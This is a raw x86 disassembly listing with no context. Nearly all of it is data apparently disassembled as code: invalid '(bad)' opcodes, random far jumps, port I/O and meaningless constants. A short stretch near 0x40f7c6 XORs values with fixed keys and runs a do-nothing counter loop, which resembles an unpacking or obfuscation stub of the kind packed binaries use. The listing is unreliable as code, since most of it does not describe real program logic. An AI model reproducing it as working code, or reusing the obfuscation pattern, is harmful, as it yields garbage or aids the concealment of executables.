  40f1b1:	jne    0x40f219
  40f1b3:	nop
  40f1b4:	test   BYTE PTR [edx+ecx*1],al
  40f1b7:	and    dh,ah
  40f1b9:	ins    BYTE PTR es:[edi],dx
  40f1ba:	idiv   BYTE PTR [edi-0x6cd25360]
  40f1c0:	sahf   
  40f1c1:	pop    ds
  40f1c2:	mov    BYTE PTR [edx+0x54],bh
  40f1c5:	loop   0x40f1de
  40f1c7:	stc    
  40f1c8:	or     al,0xb9
  40f1ca:	dec    eax
  40f1cb:	pop    ss
  40f1cc:	dec    esp
  40f1cd:	xchg   edx,eax
  40f1ce:	lock (bad) 
  40f1d0:	cdq    
  40f1d1:	sub    eax,DWORD PTR [ecx]
  40f1d3:	jmp    0x88c96a90
  40f1d8:	jecxz  0x40f233
  40f1da:	inc    eax
  40f1db:	fadd   st(7),st
  40f1dd:	dec    ebp
  40f1de:	fidivr WORD PTR [ebx-0x78]
  40f1e1:	js     0x40f254
  40f1e3:	loop   0x40f17a
  40f1e5:	mov    al,ds:0xca307354
  40f1ea:	mov    ecx,0x160d6151
  40f1ef:	pusha  
  40f1f0:	or     edx,DWORD PTR [esi]
  40f1f2:	outs   dx,BYTE PTR ds:[esi]
  40f1f3:	arpl   WORD PTR [ecx+ebp*4],ax
  40f1f6:	lea    ebp,[eax]
  40f1f8:	out    0xdf,al
  40f1fa:	addr16 sar ah,0x96
  40f1fe:	mov    esi,0xe5940241
  40f203:	outs   dx,BYTE PTR ds:[esi]
  40f204:	jb     0x40f24a
  40f206:	sbb    BYTE PTR [ebp+0x11],cl
  40f209:	mov    ebx,0x96562e59
  40f20e:	pop    esi
  40f20f:	addr16 test al,0x65
  40f212:	and    DWORD PTR [edi-0x1d],esp
  40f215:	sahf   
  40f216:	push   eax
  40f217:	cmp    BYTE PTR [ebx-0x1e],bh
  40f21a:	fcomp  DWORD PTR [eax]
  40f21c:	fs ror eax,0x47
  40f220:	(bad)  
  40f221:	ja     0x40f27e
  40f223:	pushf  
  40f224:	push   0x33e1dbe4
  40f229:	mov    eax,0x174e11e8
  40f22e:	inc    edi
  40f22f:	push   ss
  40f230:	clc    
  40f231:	je     0x40f1dc
  40f233:	push   ds
  40f234:	js     0x40f29a
  40f236:	jo     0x40f1d3
  40f238:	xor    BYTE PTR [eax],0xc7
  40f23b:	cwde   
  40f23c:	sbb    eax,0x1609ed51
  40f241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f242:	cmp    DWORD PTR [edx],esp
  40f244:	iret   
  40f245:	adc    DWORD PTR [edx+0x1d],0xc17d0e76
  40f24c:	test   DWORD PTR [ebx+0x7e],ebx
  40f24f:	fiadd  DWORD PTR [ebx]
  40f251:	push   ebx
  40f252:	xlat   BYTE PTR ds:[ebx]
  40f253:	and    esi,DWORD PTR [eax+0x5d]
  40f256:	add    eax,0x504bc1fd
  40f25b:	mov    ebp,edi
  40f25d:	cwde   
  40f25e:	fcomp  DWORD PTR [eax+0x56]
  40f261:	pop    edx
  40f262:	adc    edi,DWORD PTR [ebx+0x6ea96b1f]
  40f268:	and    ch,bh
  40f26a:	adc    eax,0xcd15dea2
  40f26f:	cmc    
  40f270:	fwait
  40f271:	test   DWORD PTR [ecx+0x69b2436e],esi
  40f277:	add    edx,DWORD PTR [esi+0x4a]
  40f27a:	fsub   st(7),st
  40f27c:	ds xchg ecx,eax
  40f27e:	repnz add DWORD PTR ds:[ecx-0x161ea2b6],ebx
  40f286:	nop
  40f287:	pop    esp
  40f288:	add    DWORD PTR [eax+0x20436f5c],edi
  40f28e:	fs mov bh,0x49
  40f291:	iret   
  40f292:	popa   
  40f293:	sbb    esi,0xc279be1f
  40f299:	es pop ss
  40f29b:	mov    ebp,0x1b8762ee
  40f2a0:	pushf  
  40f2a1:	stos   BYTE PTR es:[edi],al
  40f2a2:	out    0x4c,eax
  40f2a4:	ins    BYTE PTR es:[edi],dx
  40f2a5:	xchg   BYTE PTR [ecx],al
  40f2a7:	int    0x98
  40f2a9:	mov    WORD PTR [edx-0x2cc85183],ds
  40f2af:	pushf  
  40f2b0:	pop    edi
  40f2b1:	clc    
  40f2b2:	call   0xe682:0xcd6fafa3
  40f2b9:	dec    eax
  40f2ba:	cli    
  40f2bb:	call   0xf6b1:0x2c722ec0
  40f2c2:	sub    BYTE PTR [eax],bl
  40f2c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2c5:	xor    esi,0xffffff8b
  40f2c8:	neg    BYTE PTR [ebx+0x20da2b4f]
  40f2ce:	and    DWORD PTR [ebp+0x3f],edx
  40f2d1:	bnd jmp eax
  40f2d4:	mov    BYTE PTR [edi+0x40a338d],dl
  40f2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2db:	mov    dl,BYTE PTR [edx]
  40f2dd:	or     eax,0xfaae1c58
  40f2e2:	stos   BYTE PTR es:[edi],al
  40f2e3:	int3   
  40f2e4:	(bad)  
  40f2e6:	cld    
  40f2e7:	and    esp,esi
  40f2e9:	ss or  eax,0x1430fee0
  40f2ef:	xor    DWORD PTR [edx],ebp
  40f2f1:	mov    ecx,0x81611d82
  40f2f6:	xchg   ebx,eax
  40f2f7:	mov    bh,BYTE PTR [edx-0x13c2cb2f]
  40f2fd:	shl    BYTE PTR [edx+eiz*2],cl
  40f300:	adc    BYTE PTR [edi+0x27],ah
  40f303:	mov    bh,0x68
  40f305:	inc    ecx
  40f306:	and    dh,BYTE PTR [esi-0x14ae904c]
  40f30c:	mov    ebp,0x4e1f5664
  40f311:	add    ah,cl
  40f313:	jp     0x40f2bc
  40f315:	gs fs jno 0x40f306
  40f319:	and    DWORD PTR [ebp+0x62],0x3d6ad5ac
  40f320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f321:	ja     0x40f38a
  40f323:	adc    eax,0x50171280
  40f328:	es sahf 
  40f32a:	jp     0x40f396
  40f32c:	cs or  esi,ebp
  40f32f:	sbb    al,0x2d
  40f331:	jmp    0x3aa1:0xcc7dc719
  40f338:	dec    ecx
  40f339:	(bad)  
  40f33a:	jns    0x40f2d3
  40f33c:	imul   edx,ecx,0xa1850804
  40f342:	lahf   
  40f343:	mov    bh,0x96
  40f345:	xchg   esi,eax
  40f346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f347:	or     BYTE PTR [edx],dh
  40f349:	mov    eax,0xee5d8cde
  40f34e:	aam    0x31
  40f350:	mov    al,ds:0x684b9534
  40f355:	push   ecx
  40f356:	ins    DWORD PTR es:[edi],dx
  40f357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f358:	int3   
  40f359:	les    eax,FWORD PTR [edx]
  40f35b:	jmp    0xb377960
  40f360:	add    al,0x10
  40f362:	icebp  
  40f363:	cmp    DWORD PTR [eax-0x53],0xe7d3fea1
  40f36a:	sbb    al,0x46
  40f36c:	push   eax
  40f36d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f36e:	sub    ecx,DWORD PTR [ebx+esi*8]
  40f371:	xchg   ebp,eax
  40f372:	push   edx
  40f373:	sub    bh,0xfa
  40f376:	mov    bh,0x37
  40f378:	cmp    cl,BYTE PTR [edx+0x6d1b9e56]
  40f37e:	int    0x3
  40f380:	fcmovnu st,st(5)
  40f382:	cmp    eax,0x33f44433
  40f387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f388:	mov    ebx,cs
  40f38a:	jge    0x40f32c
  40f38c:	hlt    
  40f38d:	pop    ss
  40f38e:	in     eax,dx
  40f38f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f390:	pop    esp
  40f391:	cmc    
  40f392:	mov    ecx,0x1872853
  40f398:	(bad)  
  40f399:	movlps QWORD PTR [ecx],xmm6
  40f39c:	jne    0x40f419
  40f39e:	outs   dx,DWORD PTR ds:[esi]
  40f39f:	mov    edx,0x17ed9c44
  40f3a4:	rep stos DWORD PTR es:[edi],eax
  40f3a6:	mov    bh,0x86
  40f3a8:	mov    eax,0xbcafc421
  40f3ad:	ins    BYTE PTR es:[edi],dx
  40f3ae:	cmp    eax,0x9e759dfd
  40f3b3:	xor    al,0x35
  40f3b5:	sbb    DWORD PTR [edx-0x12],0xffffffa3
  40f3b9:	ss dec ecx
  40f3bb:	mov    ch,0xe2
  40f3bd:	or     al,0x38
  40f3bf:	aam    0xdc
  40f3c1:	gs loop 0x40f3ee
  40f3c4:	aam    0x19
  40f3c6:	test   cl,dh
  40f3c8:	addr16 pop edi
  40f3ca:	out    dx,eax
  40f3cb:	or     al,BYTE PTR [ebp-0x2b05e21d]
  40f3d1:	shl    DWORD PTR [ebx+0x32],1
  40f3d4:	sti    
  40f3d5:	sbb    ecx,0xc5e3545a
  40f3db:	dec    ebp
  40f3dc:	or     al,0x4
  40f3de:	popf   
  40f3df:	dec    esi
  40f3e0:	loop   0x40f3ef
  40f3e2:	jge    0x40f3ad
  40f3e4:	jns    0x40f389
  40f3e6:	push   edi
  40f3e7:	mov    WORD PTR [esi+0x6a],fs
  40f3ea:	std    
  40f3eb:	cmp    eax,0xeae33afc
  40f3f0:	push   esp
  40f3f1:	dec    ebp
  40f3f2:	lds    ebx,FWORD PTR ds:0x445f93de
  40f3f8:	shl    BYTE PTR [edx-0x6d4b73c4],1
  40f3fe:	gs and eax,0x5fe32d81
  40f404:	mov    esp,0xedf8fb2b
  40f409:	imul   si,ax,0xad8f
  40f40e:	add    eax,0x14218944
  40f413:	pop    ds
  40f414:	rcl    ecx,0x49
  40f417:	aas    
  40f418:	test   ch,al
  40f41a:	inc    edx
  40f41b:	inc    esp
  40f41c:	arpl   WORD PTR [ebx+0x2d],dx
  40f41f:	int    0x50
  40f421:	dec    ecx
  40f422:	mov    edi,DWORD PTR [ecx+ebx*2+0x223e8088]
  40f429:	call   0xc36cca99
  40f42e:	or     BYTE PTR [edx],bh
  40f430:	mov    ebp,0xa00677ab
  40f435:	and    cl,BYTE PTR [edi+0x10]
  40f438:	dec    eax
  40f439:	fmul   DWORD PTR [ecx-0x6e402673]
  40f43f:	mov    al,ds:0xa000757b
  40f444:	ss in  eax,0x9b
  40f447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f448:	in     al,0x9f
  40f44a:	jmp    0xd00d:0x7455d419
  40f451:	in     al,dx
  40f452:	push   esp
  40f453:	jnp    0x40f4a6
  40f455:	or     BYTE PTR [esi-0x6c],al
  40f458:	enter  0x4c70,0x48
  40f45c:	or     BYTE PTR [edx+0x47],0x43
  40f460:	pop    ds
  40f461:	ins    DWORD PTR es:[edi],dx
  40f462:	call   0x565e5d57
  40f467:	xchg   ch,al
  40f469:	pop    ds
  40f46a:	(bad)  
  40f46c:	adc    BYTE PTR [esi-0x38cabf37],bh
  40f472:	pushf  
  40f473:	sbb    ch,ah
  40f475:	fwait
  40f476:	stos   DWORD PTR es:[edi],eax
  40f477:	aam    0x81
  40f479:	adc    BYTE PTR [edi-0x287eb31d],0xd8
  40f480:	xor    al,0xa1
  40f482:	ds inc eax
  40f484:	in     eax,dx
  40f485:	push   cs
  40f486:	pop    ds
  40f487:	rcl    BYTE PTR [ebx+eiz*1+0x3991d783],1
  40f48e:	lahf   
  40f48f:	dec    esi
  40f490:	push   es
  40f491:	push   edi
  40f492:	fdivr  DWORD PTR [esi+0x30fca719]
  40f498:	les    eax,FWORD PTR [ebx+0x49]
  40f49b:	fist   WORD PTR [ebp-0x29654ac2]
  40f4a1:	stos   DWORD PTR es:[edi],eax
  40f4a2:	pop    ecx
  40f4a3:	jo     0x40f4a6
  40f4a5:	mov    WORD PTR [eax+0x4b],fs
  40f4a8:	add    al,0xc8
  40f4aa:	hlt    
  40f4ab:	aam    0xf2
  40f4ad:	jb     0x40f4ab
  40f4af:	dec    esi
  40f4b0:	not    BYTE PTR [eax]
  40f4b2:	mov    ds:0x93c573cf,al
  40f4b7:	int    0xd7
  40f4b9:	lea    ecx,[eax+0x5e]
  40f4bc:	push   ecx
  40f4bd:	inc    ebp
  40f4be:	adc    BYTE PTR [ebx-0x6ada2883],cl
  40f4c4:	push   ebp
  40f4c5:	dec    DWORD PTR [edi+0x46]
  40f4c8:	inc    ebp
  40f4c9:	xchg   ebp,eax
  40f4ca:	(bad)  
  40f4cb:	into   
  40f4cc:	xchg   edx,eax
  40f4cd:	xor    BYTE PTR [ebx],ah
  40f4cf:	and    edx,DWORD PTR [eax+0x24]
  40f4d2:	and    eax,0xeacd86fd
  40f4d7:	jmp    0x6e726f3b
  40f4dc:	imul   edx
  40f4de:	out    0x9,al
  40f4e0:	test   eax,0x286f2bd2
  40f4e5:	mov    ebp,0xe643c3c7
  40f4ea:	adc    esi,DWORD PTR [esi-0x54321c7e]
  40f4f0:	test   DWORD PTR [ebp+0xa],ebp
  40f4f3:	push   edi
  40f4f4:	hlt    
  40f4f5:	mov    dl,0x80
  40f4f7:	ret    0xbb06
  40f4fa:	int    0xa8
  40f4fc:	clc    
  40f4fd:	ret    0x6612
  40f500:	int    0x76
  40f502:	xor    esi,DWORD PTR ds:0x60087bdd
  40f508:	mov    esp,0x130247bc
  40f50d:	addr16 inc ebx
  40f50f:	ss xor al,dh
  40f512:	pop    ebx
  40f513:	fstp   DWORD PTR [ebx]
  40f515:	cdq    
  40f516:	clc    
  40f517:	or     al,0x88
  40f519:	inc    ah
  40f51b:	adc    BYTE PTR [edx],bh
  40f51d:	outs   dx,DWORD PTR ds:[esi]
  40f51e:	mov    ds:0x70d9bc1f,eax
  40f523:	and    al,0x1a
  40f525:	das    
  40f526:	adc    BYTE PTR [ebx+edx*2-0x2],ah
  40f52a:	shr    DWORD PTR [edx+eax*4+0x4b],1
  40f52e:	jmp    0x40f536
  40f530:	adc    DWORD PTR [edi-0x1211c1c6],0xf2dd8320
  40f53a:	cli    
  40f53b:	js     0x40f4f8
  40f53d:	cmc    
  40f53e:	sahf   
  40f53f:	inc    esp
  40f540:	ret    
  40f541:	fisubr WORD PTR [esi]
  40f543:	xor    bh,BYTE PTR [edx]
  40f545:	cwde   
  40f546:	sahf   
  40f547:	rep stos BYTE PTR es:[edi],al
  40f549:	cmc    
  40f54a:	out    dx,eax
  40f54b:	cwde   
  40f54c:	sahf   
  40f54d:	sub    BYTE PTR [edx+edi*4],bl
  40f550:	xchg   esp,eax
  40f551:	sub    eax,0xba1f0b66
  40f556:	ffreep st(4)
  40f558:	jg     0x40f4ed
  40f55a:	rol    DWORD PTR [edx],0x6d
  40f55d:	test   eax,0x5c73935
  40f562:	sbb    dl,BYTE PTR [esi-0xc]
  40f565:	jmp    0x6bac:0x93a4b5c5
  40f56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f56d:	cdq    
  40f56e:	xchg   ebx,eax
  40f56f:	jae    0x40f5cd
  40f571:	shr    DWORD PTR [ecx],cl
  40f573:	push   esi
  40f574:	aam    0x4e
  40f576:	mov    cl,0x85
  40f578:	and    BYTE PTR [ebx-0x5d7d3f2],cl
  40f57e:	sub    al,0x74
  40f580:	xor    bl,ch
  40f582:	cmp    BYTE PTR [ebp-0x2726706b],bh
  40f588:	cmp    ecx,edx
  40f58a:	ds mov edi,0x7c65cca6
  40f590:	push   ebp
  40f591:	cmp    DWORD PTR [esi],eax
  40f593:	loope  0x40f554
  40f595:	add    edx,edi
  40f597:	sti    
  40f598:	add    esp,0xbe3edaab
  40f59e:	mov    ds:0xbc081574,al
  40f5a3:	pop    eax
  40f5a4:	fisttp WORD PTR [edx+0x10b06038]
  40f5aa:	fs mov al,0xa3
  40f5ad:	jl     0x40f56c
  40f5af:	imul   ebp,DWORD PTR [ecx+0x73],0x54
  40f5b3:	push   eax
  40f5b4:	jne    0x40f570
  40f5b6:	pusha  
  40f5b7:	add    eax,0xcbcc6ceb
  40f5bc:	bound  esp,QWORD PTR [eax+0xe]
  40f5bf:	retf   0x9757
  40f5c2:	into   
  40f5c3:	(bad)  
  40f5c4:	dec    ebx
  40f5c5:	mov    eax,0x6baba39c
  40f5ca:	sub    DWORD PTR fs:[ecx-0x1f],esp
  40f5ce:	inc    edi
  40f5cf:	sbb    DWORD PTR [edx+ebp*2],0x25
  40f5d3:	pop    ecx
  40f5d4:	push   ss
  40f5d5:	pop    esp
  40f5d6:	or     DWORD PTR [ebx-0x696ecffa],esi
  40f5dc:	popa   
  40f5dd:	mov    ebx,0xb455ec27
  40f5e2:	xor    eax,0xb95bad20
  40f5e7:	pop    esi
  40f5e8:	aas    
  40f5e9:	pop    ss
  40f5ea:	jl     0x40f581
  40f5ec:	dec    ebp
  40f5ed:	pop    ds
  40f5ee:	lahf   
  40f5ef:	adc    DWORD PTR [edi+0x44b67d9e],edx
  40f5f5:	pop    esp
  40f5f6:	mov    ebx,DWORD PTR [eax-0x2dc2799e]
  40f5fc:	mov    es,WORD PTR [edi+ecx*2-0x13]
  40f600:	fs popf 
  40f602:	rcl    DWORD PTR [eax],cl
  40f604:	imul   edi,DWORD PTR [eax+0x2894ec38],0xffffff94
  40f60b:	data16 mov ah,0xff
  40f60e:	fadd   QWORD PTR [eax]
  40f610:	addr16 xchg ebx,eax
  40f612:	mov    ebp,0xabcb5b37
  40f617:	in     eax,dx
  40f618:	stc    
  40f619:	aaa    
  40f61a:	dec    eax
  40f61b:	add    eax,0x5001b85d
  40f620:	int    0xa7
  40f622:	jg     0x40f6a0
  40f624:	sahf   
  40f625:	out    dx,al
  40f626:	std    
  40f627:	xchg   ebp,eax
  40f628:	mov    edx,0x60bb7cf8
  40f62d:	(bad)
  40f631:	or     BYTE PTR [esi-0x5d6a05fb],ch
  40f637:	cs pushf 
  40f639:	xchg   edi,edi
  40f63b:	inc    eax
  40f63c:	lods   al,BYTE PTR ds:[esi]
  40f63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f63e:	stos   BYTE PTR es:[edi],al
  40f63f:	mov    ah,BYTE PTR [esi-0x5f20be13]
  40f645:	jle    0x40f5e3
  40f647:	cmc    
  40f648:	clc    
  40f649:	dec    eax
  40f64a:	ja     0x40f695
  40f64c:	push   esp
  40f64d:	(bad)  
  40f64e:	lods   al,BYTE PTR ds:[esi]
  40f64f:	ds in  eax,0x46
  40f652:	call   0xde8162ff
  40f657:	shl    DWORD PTR [ebx+0x30],1
  40f65a:	xor    BYTE PTR [edx],dh
  40f65c:	mov    edx,0xf1e0cc03
  40f661:	ja     0x40f61e
  40f663:	stos   DWORD PTR es:[edi],eax
  40f664:	cs aad 0x84
  40f667:	push   ebx
  40f668:	dec    esi
  40f669:	xor    BYTE PTR [ecx+ecx*2-0x2fe99bed],bl
  40f670:	pop    ebx
  40f671:	sub    eax,0x36d51e3c
  40f676:	(bad)  
  40f677:	in     eax,0x44
  40f679:	imul   ebx,DWORD PTR [eax+edi*4-0x4b],0xfffffffc
  40f67e:	mov    al,0x42
  40f680:	rcl    DWORD PTR [edi+0x63ec142e],1
  40f686:	popa   
  40f687:	push   ebp
  40f688:	pop    ss
  40f689:	push   eax
  40f68a:	cmp    eax,0x3b3bd952
  40f68f:	aam    0x53
  40f691:	xchg   esi,eax
  40f692:	dec    eax
  40f693:	popa   
  40f694:	cmp    bh,BYTE PTR [eax]
  40f696:	sub    esi,ebp
  40f698:	inc    ebx
  40f699:	inc    ebp
  40f69a:	xchg   ebp,eax
  40f69b:	mov    bh,0xe0
  40f69d:	xchg   edx,eax
  40f69e:	sub    eax,0x4e194367
  40f6a3:	push   eax
  40f6a4:	repnz fmul QWORD PTR [edi-0x5408250c]
  40f6ab:	in     al,dx
  40f6ac:	retf   
  40f6ad:	add    bl,BYTE PTR [edi-0xa2e4c12]
  40f6b3:	and    edx,0x31
  40f6b6:	pop    ebp
  40f6b7:	gs fsubr st,st(4)
  40f6ba:	fwait
  40f6bb:	call   0xbb363dbb
  40f6c0:	jnp    0x40f69b
  40f6c2:	and    al,0x45
  40f6c4:	adc    al,0x56
  40f6c6:	popa   
  40f6c7:	mov    dh,bl
  40f6c9:	scas   al,BYTE PTR es:[edi]
  40f6ca:	mov    ebp,0x75b7ba46
  40f6cf:	sub    DWORD PTR [ebx-0x140b6fbb],esp
  40f6d5:	gs dec eax
  40f6d7:	push   0xfffffff3
  40f6d9:	retf   
  40f6da:	mov    dl,0xcc
  40f6dc:	sub    DWORD PTR [eax+0x6c],edi
  40f6df:	jle    0x40f6b4
  40f6e1:	sti    
  40f6e2:	add    eax,0x5bdf1307
  40f6e7:	bound  esp,QWORD PTR [esi]
  40f6e9:	sar    DWORD PTR [esi-0x4b6fd46c],cl
  40f6ef:	xor    BYTE PTR [ebx-0x437afd8f],0x6b
  40f6f6:	jo     0x40f75f
  40f6f8:	push   0x60
  40f6fa:	sub    al,0x8c
  40f6fc:	add    ah,BYTE PTR [edi+0x5103a2fe]
  40f702:	pop    esp
  40f703:	rol    DWORD PTR gs:[ebp+0x51ca37c2],0x31
  40f70b:	loopne 0x40f6ab
  40f70d:	jge    0x40f6a5
  40f70f:	push   edx
  40f710:	jmp    0xaec3d605
  40f715:	ds es (bad) 
  40f718:	mov    al,ds:0x3ed03ac9
  40f71d:	sahf   
  40f71e:	xor    esp,esi
  40f720:	inc    edx
  40f721:	mov    ch,cl
  40f723:	cwde   
  40f724:	icebp  
  40f725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f726:	fs scas al,BYTE PTR es:[edi]
  40f728:	sbb    al,0x3f
  40f72a:	cmp    DWORD PTR [edx-0x17],ecx
  40f72d:	jmp    0xc0e4:0x3b88d4b3
  40f734:	rcr    esi,cl
  40f736:	sub    al,bl
  40f738:	cli    
  40f739:	popa   
  40f73a:	xchg   ecx,eax
  40f73b:	inc    ebp
  40f73c:	add    edi,DWORD PTR [eax-0x5dfaf1a4]
  40f742:	and    DWORD PTR [ecx],ebx
  40f744:	inc    eax
  40f745:	retf   
  40f746:	and    al,0x3
  40f748:	aaa    
  40f749:	push   edx
  40f74a:	cmp    al,0x89
  40f74c:	shl    BYTE PTR [ebx+0x11fe7231],1
  40f752:	mov    ah,0x59
  40f754:	daa    
  40f755:	gs sub al,0xf0
  40f758:	dec    ecx
  40f759:	xchg   esi,eax
  40f75a:	push   esp
  40f75b:	mov    al,ds:0x226ec056
  40f760:	add    ch,dl
  40f762:	add    BYTE PTR [ecx],ch
  40f764:	scas   al,BYTE PTR es:[edi]
  40f765:	lea    ebp,[ecx+0x62]
  40f768:	mov    al,0xa3
  40f76a:	idiv   DWORD PTR [ebp+0x2c]
  40f76d:	xchg   BYTE PTR [ecx+0x0],bl
  40f770:	ds mov cs,esp
  40f773:	pop    ds
  40f774:	xchg   edx,eax
  40f775:	mov    ebp,0x3505771e
  40f77b:	xlat   BYTE PTR ds:[ebx]
  40f77c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f77d:	lock mov eax,ds:0x54a96ede
  40f783:	and    ebp,DWORD PTR [ecx-0x2]
  40f786:	test   bh,ch
  40f788:	stos   BYTE PTR es:[edi],al
  40f789:	dec    edi
  40f78a:	adc    BYTE PTR [edx+ecx*8-0x1fa0edef],dh
  40f791:	mov    edx,0x79a530fc
  40f796:	ins    DWORD PTR es:[edi],dx
  40f797:	int3   
  40f798:	jne    0x40f783
  40f79a:	cmp    edx,0x22e02818
  40f7a0:	pop    ss
  40f7a1:	mov    ecx,0x51e6d6b8
  40f7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7a7:	add    BYTE PTR [edx],0x96
  40f7aa:	lods   al,BYTE PTR ds:[esi]
  40f7ab:	or     bh,bh
  40f7ad:	or     BYTE PTR [ecx-0x330e1a28],dh
  40f7b3:	imul   esi,DWORD PTR [edi+0x4b1fa2fe],0x4846c89f
  40f7bd:	cdq    
  40f7be:	add    DWORD PTR [ebp+0x457261a3],ebp
  40f7c4:	fdiv   DWORD PTR [esi]
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xa04ca430
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	or     edx,DWORD PTR [ebp+0x2290315d]
  40f876:	push   ss
  40f877:	jbe    0x40f864
  40f879:	stos   BYTE PTR es:[edi],al
  40f87a:	daa    
  40f87b:	dec    ebx
  40f87c:	jmp    0x40f82a
  40f87e:	cmp    eax,0xb186de1
  40f883:	retf   0xcdde
  40f886:	dec    edx
  40f887:	mov    al,ds:0x8a93178e
  40f88c:	aas    
  40f88d:	jb     0x40f880
  40f88f:	xchg   ebx,eax
  40f890:	(bad)  
  40f891:	mov    ebp,DWORD PTR [esi+0x19]
  40f894:	dec    edx
  40f895:	adc    bl,BYTE PTR [ebp+edx*2-0x7f]
  40f899:	iret   
  40f89a:	fild   WORD PTR [edx]
  40f89c:	xchg   ebx,eax
  40f89d:	push   esi
  40f89e:	fdivr  st(4),st
  40f8a0:	or     BYTE PTR [edi],cl
  40f8a2:	(bad)  
  40f8a3:	pop    ebx
  40f8a4:	xor    BYTE PTR [eax-0x74],dl
  40f8a7:	sbb    DWORD PTR [edi-0x62e37958],esi
  40f8ad:	push   ecx
  40f8ae:	ret    0x5341
  40f8b1:	inc    ebp
  40f8b2:	hlt    
  40f8b3:	out    0xb2,eax
  40f8b5:	adc    edx,DWORD PTR [esi]
  40f8b7:	cmp    esi,DWORD PTR [edi+0x654a1550]
  40f8bd:	aas    
  40f8be:	jo     0x40f90a
  40f8c0:	fiadd  DWORD PTR [ebx+edi*1-0x5516dbd0]
  40f8c7:	loope  0x40f8c0
  40f8c9:	enter  0xc4b5,0xb1
  40f8cd:	push   ss
  40f8ce:	(bad)  
  40f8cf:	repz jg 0x40f91f
  40f8d2:	xchg   BYTE PTR [eax+0xc],dl
  40f8d5:	ret    0x856c
  40f8d8:	xor    eax,0x4c4cd253
  40f8dd:	lods   al,BYTE PTR ds:[esi]
  40f8de:	fwait
  40f8df:	rol    BYTE PTR [eax],cl
  40f8e1:	scas   eax,DWORD PTR es:[edi]
  40f8e2:	inc    ebp
  40f8e3:	add    edx,DWORD PTR [ecx-0x2c]
  40f8e6:	fisttp DWORD PTR [edx+edi*8+0x9]
  40f8ea:	and    ebp,DWORD PTR [ecx+0x2e]
  40f8ed:	add    dl,BYTE PTR [ebx+ebx*8+0x1]
  40f8f1:	jg     0x40f965
  40f8f3:	adc    BYTE PTR [edi-0x3de232e0],bl
  40f8f9:	push   ebp
  40f8fa:	test   eax,0xc9f70049
  40f8ff:	(bad)  
  40f900:	fld    QWORD PTR [ebx-0x5d3ee22b]
  40f906:	in     eax,0x76
  40f908:	or     dl,BYTE PTR [eax+esi*2+0x4fe99bbe]
  40f90f:	mov    ah,0xc2
  40f911:	popf   
  40f912:	and    BYTE PTR [ebx-0x51],ch
  40f915:	dec    edi
  40f916:	pop    eax
  40f917:	(bad)
  40f91b:	outs   dx,BYTE PTR cs:[esi]
  40f91d:	sub    al,0xbe
  40f91f:	jb     0x40f95e
  40f921:	inc    ebp
  40f922:	and    al,0x16
  40f924:	jnp    0x40f98c
  40f926:	nop
  40f927:	push   ss
  40f928:	sbb    eax,0xe8f59970
  40f92d:	adc    BYTE PTR [ecx+0x4e],bl
  40f930:	jnp    0x40f971
  40f932:	(bad)  
  40f933:	int    0xc9
  40f935:	add    ah,bl
  40f937:	adc    dh,BYTE PTR ds:0x89500442
  40f93d:	enter  0x2b1c,0xc
  40f941:	addr16 in al,0x4c
  40f944:	jle    0x40f947
  40f946:	mov    esp,0x9cdfbd7d
  40f94b:	(bad)  
  40f94c:	gs jbe 0x40f8fc
  40f94f:	daa    
  40f950:	mov    cl,0x1
  40f952:	cld    
  40f953:	jl     0x40f90b
  40f955:	mov    bl,0x6e
  40f957:	mov    WORD PTR [edi],ds
  40f959:	repnz cdq 
  40f95b:	std    
  40f95c:	imul   ecx,DWORD PTR [eax-0x311ae2f0],0x99551ca7
  40f966:	push   edi
  40f967:	lods   al,BYTE PTR ds:[esi]
  40f968:	pop    es
  40f969:	adc    BYTE PTR [edx-0x28],bl
  40f96c:	fild   DWORD PTR [eax-0x4206e79e]
  40f972:	stos   BYTE PTR es:[edi],al
  40f973:	or     esi,edx
  40f975:	pop    edi
  40f976:	daa    
  40f977:	add    al,0x27
